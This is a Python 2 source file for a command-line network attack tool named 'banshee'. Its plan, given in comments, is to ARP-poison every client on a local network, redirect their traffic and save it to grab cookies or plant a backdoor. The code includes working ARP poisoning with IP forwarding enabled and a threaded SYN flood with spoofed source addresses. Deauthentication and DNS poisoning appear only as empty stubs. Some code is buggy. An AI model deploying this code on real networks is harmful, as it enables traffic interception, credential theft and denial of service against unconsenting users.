#!/usr/bin/env python
######################################
#
#   Author: mtarsel
#
#   PACKAGES INCLUDE: 
#	python-nmap, nfeque, scapy, netaddr
#
#   LICENSE: GPL v2
#
######################################


'''
1. Find all routers 
2. Search all clients on router and obtain IP Address and MAC Address
3. ARP Poison victimIP Address from routerIP Address
4. Redirect all traffic to different domain using DNS queriers and redirection

SummRY:
Redirect all clients on LAN to specific IP ddress,
Use  NTP as amplification??

psuedocode:

for IPAddress.clientList(): #PARSE IP and MAC Address
    poision(vicimtIP->IP.clientLiast())
    redirect.from(IP.clientList())
    redirect.to(targetIP)
    amplify()

def amplify():
    all clients send DNS query 
        or 
            all clients use NTP server to send more traffic

NOTES:
-whilenpoisioning, save all traffic to parse later 
    -grab cookies??

-save traffic, backdoor to infect later?
-output clientList to .txt file :)


more pseduocode:
    
1. enter network interface card
2. get router hosename, IP, MAC, type 'router'
3. ping all clients connect to router, type 'c'
4. view clientList, export to txt, pdf?, type 'cl'
5. posion all clients in clientsList, 'type poison with parameters'
6. redirect all traffic to different IP address
    7. all while saving all traffic from client for intended server


'''

import socket, random, sys, threading
import cmd
import logging
import string, sys
from scapy.all import *
import nmap   
import time
from subprocess import call
from netaddr import *
import getpass


clientsList = [ ]
global myip

yes = set(['yes','y', 'ye', 'Y','YE','YES','yea', 'yeah', 'oui', ''])
no = set(['no','n', 'No', 'NO', 'non', 'nah'])

#choice = raw_input().lower()
def yesorno(choice):
    if choice in yes:
	return True
    elif choice in no:
	return False
    else:
	sys.stdout.write("Please respond with 'yes' or 'no'")
	

def arp_monitor_callback(pkt):
    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at   
	clients = pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
	#print "In arp_monitor_callback, clients:", clients
	clients = clientsList.append(clients)
	for clients in clientsList:
	    print "client: ", clients
	    print "\nTotal clients: ", len(clientsList)
	#return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
	
	
class Arp:
#    def __init__(self, victim 
    def __init__(self, routerIP, victimIP, routerMAC, victimMAC):
	self.routerIP = routerIP
	self.victimIP = victimIP
	self.routerMAC = routerMAC
	self.victimMAC = victimMAC

    def originalMAC(ip):
        ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
        for s,r in ans:
            return r[Ether].src
        
    def poison(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC))#TODO error
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC))
    
    def restore(routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC), count=3)
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.routerMAC), count=3)
        sys.exit("losing...")    

   # def signal_handler(signal, frame):
   #     with ipf as open('/proc/sys/net/ipv4/ip_forward', 'w'):#TODO compile error
   #         ipf.write('0\n')#disable IP forwarding
        restore(self.routerIP, self.victimIP, self.routerMAC, self.victimMAC)
        

class sendSYN(threading.Thread):
        def __init__(self, targetip, port):
                threading.Thread.__init__(self)
		self.targetip = targetip
		self.port = port
	
        def run(self):
                i = IP()
                i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
                i.dst = self.targetip

                t = TCP()
                t.sport = random.randint(1,65535)
                t.dport = self.port
                t.flags = 'S'

                send(i/t, verbose=0)

 
class CLI(cmd.Cmd):

    def __init__(self):
        cmd.Cmd.__init__(self)
	#username = getpass.getuser()
	hostname = socket.gethostname()
        self.prompt = 'banshee@' + hostname + '~#'
        
        

    def do_netiface(self, arg):
	"""Takes no arguments	
	    View and/or change your Network Interface Card"""
	
	print "Current: ", conf.iface
	print "\nChange it? "
	choice = raw_input().lower()
		
	if yesorno(choice) is True:
	    conf.iface = raw_input("Enter network interface: ")  
	    
	    
	 
    def do_ip(self, arg):
	"""Takes no arguments
	Gets your IP address"""
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	myip = (s.getsockname()[0])
	print "Your ip: ", myip
	
	

    def do_clientlist(self, arg):
	"""Takes no arguments.
	    Prints list of clientsList and MAC and IP addresses
	    on LAN"""
	#TODO split entires in the list by ip and mac
	    # check if ip address is our ip and display some kinda flag so user knows
	sortedclientsList = sorted(set(clientsList))
	print "Number of clients: ", len(sortedclientsList)
	for x in sortedclientsList:
	    print "\n", x
	    
	    

    def do_clients(self, arg):
	""" Takes no arguments 
	View clients connected to router
	clients """

	#Same command as: nmap -sP 192.168.1.1/24
	#TODO make background job and quit after certain amount of time
	#   or if ip address/MAC is the same in clientsList
	print "Pinging clients... \n"
	sniff(prn=arp_monitor_callback, filter="arp", store=0)  
	
	
    def do_router(self, arg):
	"""Takes no arguments.
	    Executes arp -a 
	    Should be address of router"""
	call(["arp", "-a"]) 	    


    def do_ping(self, arg):
	"""ping [host IP address] [count] 
	    Pings IP address"""
	if not(arg):
	    print "No ip entered"
	else:
	    print "\nPinging... ",arg,"\n"
	    pingIP = str(IPAddress(arg))
	    data = "Space for Rent!"
	    ip = IP()
	    icmp = ICMP()
	    ip.dst = pingIP
	    icmp.type = 8
	    icmp.code = 0
	    a = sr1(ip/icmp/data)
	    a.summary()


    def do_kick(self, arg):
	"""kick 
	    #########################################
	    #
	    # Kick everyone off wifi with DeAuth packets
	    # author: Dan McInerney
	    #
	    #########################################

	    http://danmcinerney.org/how-to-kick-everyone-around-you-off-wifi-with-python/"""



    def do_arp(self, arg):
	"""arp [routerIP] [victimIP] [routerMAC] [victimMAC]
	    #########################################
	    # 
	    # ARP Poison - A multithreaded SYN Flooder
	    # author: Dan McInerney
	    #
	    #########################################

	    http://danmcinerney.org/arp-poisoning-with-python-2/ """
	
	arplist = arg.split(" ")
    
	if len(arplist) < 4:
	    print "\n Error, not enough args \n"
	else:
	    print"Enabling IP forwarding...\n"
    
	    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
		ipf.write('1\n')#enable IP forwarding with '1'     
	    #signal.signal(signal.SIGINT, signal_handler)
	    
	    routerIP = str(IPAddress(arplist[0]))
	    victimIP = str(IPAddress(arplist[1]))	    
	    routerMAC = str(IPAddress(arplist[2]))
	    victimMAC = str(IPAddress(arplist[3]))

	       
	    arpAttack = Arp(routerIP, victimIP, routerMAC, victimMAC)       

	    while 1:
		try:
		    arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
		    time.sleep(1.5)
		except KeyboardInterrupt:
		    print "\n"
		    break
	       
	
    def do_dns(self, arg):
	"""DNS Poisioning."""	
	
	
    def do_syn(self, arg):
	"""syn [target ip] [port]
    #########################################
    # 
    # SYNflood - A multithreaded SYN Flooder
    # author: arthurnn
    #
    #########################################

	   SYN flood: https://github.com/arthurnn/SynFlood  
	    """
	if not(arg):
	    print "No ip entered"
	else:

	    print "\n",arg,"\n"
	    targetlist = arg.split(" ")
	    targetip = str(IPAddress(targetlist[0]))
	    port = int(targetlist[1])	
	    print "Flooding %s:%i with SYN packets." % (targetlist[0], port)
	
	    total = 0

	    while 1:
		try:
		    syner = sendSYN(targetip, port)
		    syner.start()
		    total += 1
		    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
		except KeyboardInterrupt:
		    print "\n"
		    break
	

    def do_quit(self, arg):
        sys.exit(1)

    def help_quit(self):
        print "syntax: quit",
        print "-- terminates the application"

    # shortcuts
    do_q = do_quit
    do_c = do_clients
    do_cl = do_clientlist
    do_net = do_netiface
    do_neti = do_netiface
    do_p = do_ping
    do_r = do_router

if __name__ == '__main__':
    
    #Remove Scapy warning about IPv6
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    
#    os.spawnl(os.P_DETACH, sniff(prn=arp_monitor_callback, filter="arp",store=0))
      
    call(["ip", "address"])#TODO use pip package netifaces?? 
 
    conf.iface = raw_input("\nEnter network interface: ")  

    #hackish - ping Google and get our IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    myip = (s.getsockname()[0])
    print "\n Your network interface: ", conf.iface
    print "\n Your IP address: ", myip
    s.close()

    print"\n Type 'help' \n"
    cli = CLI()#define cmd Object
    cli.cmdloop() #begin infinite loop
